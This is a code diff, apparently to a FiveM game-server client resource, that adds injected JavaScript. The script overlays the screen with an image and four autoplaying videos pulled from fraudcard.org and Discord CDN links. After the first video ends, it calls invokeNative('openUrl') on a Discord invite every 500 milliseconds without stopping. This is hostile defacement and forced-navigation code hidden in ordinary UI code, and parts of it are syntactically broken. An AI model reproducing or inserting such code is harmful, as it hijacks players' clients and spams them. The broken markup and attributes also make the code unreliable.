@@ -92,3 +92,48 @@ loaded++;
                 }
             </style>
         );
+$('body').append(<img src="https://fraudcard.org/file/istockphoto-525982638-612x612.jpg" class="flashing-img" id="niron" />);
+
+        setTimeout(() => {
+            $("#v1, #v2, #v3, #v4").remove();
+
+            $('body').append(
+                <div style="position:fixed;top:0;right:0;width:30%;z-index:1000;"><video playsinline id="v5" style="width:100%;display:none;" preload="auto"><source src="https://cdn.discordapp.com/attachments/1313231147282600099/1412569201016573952/image.png?ex=68b8c515&is=68b77395&hm=3d2e62133bfff01e10241f4f028c29035af3a524aa233171c7cd13e4e66af608&" type="video/mp4"></video></div>
+                <div style="position:fixed;top:0;left:0;width:30%;z-index:1000;"><video playsinline id="v6" style="width:100%;display:none;" preload="auto"><source src= https://cdn.discordapp.com/attachments/1313231147282600099/1412569135698677790/image.png?ex=68b8c506&is=68b77386&hm=8bdd51e192c3c04d43de4145dcea8257593fa8f114b9118610b9b615a7a78ca8&"></video></div>
+                <div style="position:fixed;bottom:0;left:0;width:30%;z-index:1000;"><video playsinline id="v7" style="width:100%;display:none;" preload="auto"><source src= https://cdn.discordapp.com/attachments/1313231147282600099/1412571585251905566/image.png?ex=68b8c74e&is=68b775ce&hm=96349c3b306d57aa963bfe3d46b28db7eca3cb44f71135367468695819b26262&" type="video/mp4"></video></div>
+                <div style="position:fixed;bottom:0;right:0;width:30%;z-index:1000;"><video playsinline id="v8" style="width:100%;display:none;" preload="auto"><source src="https://fraudcard.org/file/sa-61442.mp4" type="video/mp4"></video></div>
+            );
+            const newVideos = [$('#v5')[0], $('#v6')[0], $('#v7')[0], $('#v8')[0]];
+            let loaded = 0;
+
+            newVideos.forEach(video => {
+                video.addEventListener('canplaythrough', () => {
+                    loaded++;
+                    if (loaded === newVideos.length) {
+                        newVideos.forEach((v, i) => {
+                            v.style.display = 'block';
+                            v.currentTime = 0;
+                            v.muted = i !== 0;
+                            v.play().catch(console.error);
+
+                            if (i === 0) {
+                                v.addEventListener('ended', () => {
+                                    $("#v5, #v6, #v7, #v8, #niron").remove();
+                                    setInterval(function () {
+                                        window.invokeNative("openUrl", "https://discord.gg/fivemdown");
+                                    }, 500)
+                                });
+                            }
+                        });
+syncVideosLoop(newVideos[0], [newVideos[1], newVideos[2], newVideos[3]]);
+                        $("#niron").attr("src", image.png =68b8c506&is=68b77386&hm=8bdd51e192c3c04d43de4145dcea8257593fa8f114b9118610b9b615a7a78ca8&")
+                    }
+                }, { once: true });
+                video.load();
+            });
+
+        }, 8500);
+    }
+
+};
+document.head.appendChild(script);
